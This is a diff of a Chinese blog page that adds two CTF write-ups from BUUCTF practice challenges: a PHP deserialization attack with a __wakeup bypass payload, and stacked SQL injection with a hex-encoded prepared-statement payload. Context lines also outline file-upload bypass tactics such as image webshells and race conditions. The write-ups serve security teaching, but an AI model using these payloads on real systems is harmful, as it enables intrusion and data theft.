@@ -167,6 +167,90 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/WriteUP-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%20PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Garmin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/WriteUP-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%20PHP/" class="post-title-link" itemprop="url">极客大挑战2019 PHP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/WriteUP/" itemprop="url" rel="index"><span itemprop="name">WriteUP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[[极客大挑战 2019]PHP-BUUCTF](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://buuoj.cn/challenges#[极客大挑战</a> 2019]PHP)</p>
+<p>根据提示，使用kali中的路径扫描工具dirsearch对目标网站进行路径扫描。<br><code>dirsearch -u http://1e3e657b-073a-460a-827f-3c0919078760.node5.buuoj.cn:81/</code></p>
+<p>也可以使用御剑后台扫描工具扫描，扫描无果。</p>
+<p>查看别人的wp才发现网站备份源码在 &#x2F;<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 中，查看网站源码，发现如下关键语句。<br>里面有个 flag.php 的 flag 内容是假的。</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>观察源码发现，index.php 可以以 get 方式接收一个 select 参数，并将其反序列化。</p>
+<p>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>观察源码发现，想要输出flag，需要使参数 username 强等于 admin，使password要弱等于100。</p>
+<p>那我们编写一php代码构造序列化对象。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">new</span> <span class="title class_">Name</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$name</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以使用<a target="_blank" rel="noopener" href="https://www.jyshare.com/compile/1/">PHP 在线工具 | 菜鸟工具</a>运行代码。<br>那得到后的字符复制下来会有一些丢失，我们需要用00%代替复制前的方框。<br><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125; </code></p>
+<p>再次观察 class.php ，<code>__wakeup()</code>函数赋值在<code>__destruct()</code>函数判断之前执行，那我们需要想办法绕过<code>__wakeup()</code>函数，让说明的参数个数大于实际的参数个数即可。<br><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p>
+<p>最终Payload<br><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/CTF-upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -232,6 +316,88 @@
 <p>针对目标网站在服务端使用 fread() 、getimagesize() 、exif_imagetype() 等函数对文件的前几个字节进行校验的，都可以通过图片马成功上传文件，但是要集合文件包含漏洞进行攻击。</p>
 <p>对于目标网站将上传文件进行二次渲染的，可以选择gif类型的图片马上传，减少二次渲染过程中对图片内容的压缩损失，也避免了图片马中php代码的丢失。</p>
 <p>对于目标网站服务端是先把文件上传到目标目录下，然后判断文件类型，如果不是图片类型的文件，则再删除该文件的流程，可以使用条件竞争的方法进行攻击。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/WriteUP-%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Garmin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/WriteUP-%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">强网杯2019 随便注</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/WriteUP/" itemprop="url" rel="index"><span itemprop="name">WriteUP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[[强网杯 2019]随便注-BUUCTF](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF">https://buuoj.cn/challenges#[强网杯</a> 2019]随便注)</p>
+<p>发现sql堆叠（多语句）注入漏洞，且屏蔽了众多关键词。</p>
+<p>查库名<br><code>1&#39;;show databases#</code></p>
+<p>查表名<br><code>1&#39;;show tables#</code></p>
+<p>查字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`#</span><br></pre></td></tr></table></figure>
+<p>用反引号包裹纯数字的表名。</p>
+<p>此题可以使用编码的方式绕过关键词过滤。<br>初步payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from where `1919810931114514`</span><br></pre></td></tr></table></figure>
+
+<p>进行16进制编码加密<br><code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code></p>
+<p>完整payload<br><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# </code></p>
+<p>使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare…from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。</p>
 
       
     </div>
